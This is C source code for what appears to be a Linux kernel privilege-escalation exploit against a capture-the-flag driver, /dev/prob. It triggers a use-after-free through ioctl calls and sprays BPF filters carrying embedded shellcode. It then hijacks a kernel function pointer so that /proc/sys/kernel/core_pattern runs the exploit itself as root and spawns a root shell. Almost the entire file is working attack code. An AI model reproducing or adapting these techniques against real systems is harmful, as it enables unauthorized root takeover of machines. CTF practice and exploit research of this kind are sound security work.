#define _GNU_SOURCE
#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <stdlib.h>
#include <unistd.h>
#include <stddef.h>
#include <stdint.h>
#include <stdbool.h>

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/resource.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>

#include <linux/filter.h>
#include <linux/seccomp.h>

#include "modules/helper.h"

#define ADD_NOTE 0x10000
#define DEL_NOTE 0x10001
#define GET_NOTE 0x10002

struct note {
    char data[0x20];
};

struct input {
    uint64_t idx;
    char *data;
};

// b *0xffffffffc02011f6
int make_note(int fd, int idx, char *data) {
	struct input uinput = {
		.idx = idx,
		.data = data
	};
	if(ioctl(fd, ADD_NOTE, &uinput) < 0)
		perror("ioctl");
}

int get_note(int fd, int idx, char *data) {
	struct input uinput = {
		.idx = idx,
		.data = data
	};
	if(ioctl(fd, GET_NOTE, &uinput) < 0)
		perror("ioctl");
}

int del_node(int fd, int idx) {
	struct input uinput = {
		.idx = idx
	};
	if(ioctl(fd, DEL_NOTE, &uinput) < 0)
		perror("ioctl");
}

static int rlimit_increase(int rlimit)
{
    struct rlimit r;
    if (getrlimit(rlimit, &r))
        perror("rlimit_increase:getrlimit");

    if (r.rlim_max <= r.rlim_cur)
    {
        printf("[+] rlimit %d remains at %.lld", rlimit, r.rlim_cur);
        return 0;
    }
    r.rlim_cur = r.rlim_max;
    int res;
    if (res = setrlimit(rlimit, &r))
        perror("rlimit_increase:setrlimit");
    else
        printf("[+] rlimit %d increased to %lld\n", rlimit, r.rlim_max);
    return res;
}

struct sock_filter filter[0x1000];
int stopfd[2];
char buf[0x1000];
#define SYSCHK(x)                     \
	({                                \
		typeof(x) __res = (x);        \
		if (__res == (typeof(x))-1)   \
			err(1, "SYSCHK(" #x ")"); \
		__res;                        \
	})

int sc(void)
{
    unsigned int prog_len = 0x900;
    /* In current environment, the max instructions in a program is near 0x900
    And we test 0x900 instructions * 0x50 forks * 0x100 sockets * 4 = 180 MB is enough large to spray and worked reliably
    */
    struct sock_filter table[] = {
        {.code = BPF_LD + BPF_K, .k = 0xb3909090},
        {.code = BPF_RET + BPF_K, .k = SECCOMP_RET_ALLOW}};
     
/* 0xb3909090 is NOPsled shellclode to make exploitation more reliable
90       nop
90       nop
90       nop
b3 b8    mov    bl, 0xb8
*/
    for (int i = 0; i < prog_len; i++)
        filter[i] = table[0];
 
    filter[prog_len - 1] = table[1];
    int idx = prog_len - 2;
 
#include "sc.h"
 
    struct sock_fprog prog = {
        .len = prog_len,
        .filter = filter,
    };
    int fd[2];
    for (int k = 0; k < 0x50; k++)
    {
        if (fork() == 0) // use fork to bypass RLIMIT_NOFILE limit.
        {
            close(stopfd[1]);
            for (int i = 0; i < 0x100; i++)
            {
                SYSCHK(socketpair(AF_UNIX, SOCK_DGRAM, 0, fd));
                SYSCHK(setsockopt(fd[0], SOL_SOCKET, SO_ATTACH_FILTER, &prog, sizeof(prog)));
            }
           	write(stopfd[0], buf, 1);
            read(stopfd[0], buf, 1);
            exit(0);
        }
    }
    /* wait for all forks to finish spraying BPF code */
    read(stopfd[1], buf, 0x50);
}

void root(char *buf)
{
	int pid = strtoull(buf, 0, 10);
	char path[0x100];
	printf("run root(), %d\n", getuid());
	// fix stdin, stdout, stderr
	sprintf(path, "/proc/%d/ns/net", pid);
	int pfd = syscall(SYS_pidfd_open, pid, 0);
	int stdinfd = syscall(SYS_pidfd_getfd, pfd, 0, 0);
	int stdoutfd = syscall(SYS_pidfd_getfd, pfd, 1, 0);
	int stderrfd = syscall(SYS_pidfd_getfd, pfd, 2, 0);
	dup2(stdinfd, 0);
	dup2(stdoutfd, 1);
	dup2(stderrfd, 2);
	// just cat the flag
	system("cat /dev/sda;bash");
}


int check_core()
{
    // Check if /proc/sys/kernel/core_pattern has been overwritten
    char buf[0x100] = {};
    int core = open("/proc/sys/kernel/core_pattern", O_RDONLY);
    read(core, buf, sizeof(buf));
    close(core);
    return strncmp(buf, "|/proc/%P/fd/666 %P", strlen("|/proc/%P/fd/666 %P")) == 0;
}

int main(int argc, void *argv[])
{
	cpu_affinity(0);
	rlimit_increase(RLIMIT_NOFILE);  
	socketpair(AF_UNIX, SOCK_STREAM, 0, stopfd);  

	if (argc > 1)
	{
		printf("triggered from core_pattern\n");
		root(argv[1]);
		exit(0);
	}

	if(fork())
	{
		while(true)
		{
			if(check_core())
			{
				printf("core_pattern has been overwritten\n");
				int memfd = memfd_create("x", 0);
				SYSCHK(sendfile(memfd, open("/proc/self/exe", 0), 0,
								0xffffffff));
				dup2(memfd, 666);
				close(memfd);
				// trigger crash
				*(size_t *)0 = 0;
			}	
			sleep(1);
		}
	}

	sc();
	
	int fd1;
	if((fd1 = open("/dev/prob", O_RDWR)) < 0)
		panic("open");
	
	char *fault_addr = (char *)mmap((void *)0x1337000, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
	if(fault_addr == MAP_FAILED)
		panic("mmap");
	
	fault_addr += 0xfff;
	make_note(fd1, 0, fault_addr);

	int seqfd = open("/proc/self/stat", O_RDONLY);
	del_node(fd1, 0);

	uint64_t data[4];
	for(int i=0; i<4; i++)
		data[i] = 0xffffffffc1000000-0x600;
	make_note(fd1, 0, data);

	printf("[+] overwrite funcptr fin");

	int userbuf = mmap(0xa00000, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
	memcpy(userbuf, "|/proc/%P/fd/666 %P", 0x30);
	
	read(seqfd, data, 1);
	sleep(1000000);
}